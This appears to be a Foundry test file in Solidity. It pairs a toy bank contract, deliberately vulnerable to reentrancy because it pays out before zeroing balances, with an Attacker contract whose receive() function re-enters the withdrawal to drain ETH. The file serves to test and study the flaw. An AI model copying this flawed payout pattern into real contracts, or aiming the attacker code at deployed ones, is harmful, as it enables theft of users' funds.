
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";

contract MiniBank {
    mapping(address => uint256) private _balances;
    mapping(address => uint256) public membershipPoints;
    bool private _paused;

    modifier whenNotPaused() {
        require(!_paused, "Contract is paused");
        _;
    }

    function receiveCurrency() external payable whenNotPaused {
        require(msg.value > 0, "Cannot deposit 0");
        _balances[msg.sender] += msg.value;
        membershipPoints[msg.sender]++;
    }

    function sendCurrency() external whenNotPaused {
        uint256 amountToWithdraw = _balances[msg.sender];
        require(amountToWithdraw > 0, "Insufficient balance");
        
        // Corrected function name from _executeWithdrawal to _executeSendCurrency to match definition
        _executeSendCurrency(msg.sender, amountToWithdraw);
    }

    function _executeSendCurrency(address beneficiary, uint256 amount) internal {
        (bool success, ) = payable(beneficiary).call{value: amount}("");
        require(success, "Transfer failed");

        _balances[beneficiary] = 0;
        membershipPoints[beneficiary] = 0;
    }
}

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state setup required beyond funding.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 5); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        _victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        // Trigger the withdrawal
        _victim.sendCurrency();

        // Verify Success Conditions
        // If reentrancy occurred, attackCallCount will be incremented multiple times
        // and the balance of this contract will exceed the initial deposit + withdrawals logic
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter the contract if we haven't hit the recursion limit
        // and the victim still has funds to steal.
        if (attackCallCount < 3 && address(_victim).balance >= storedAttackVal) {            
            _victim.sendCurrency();
        }
    }
}
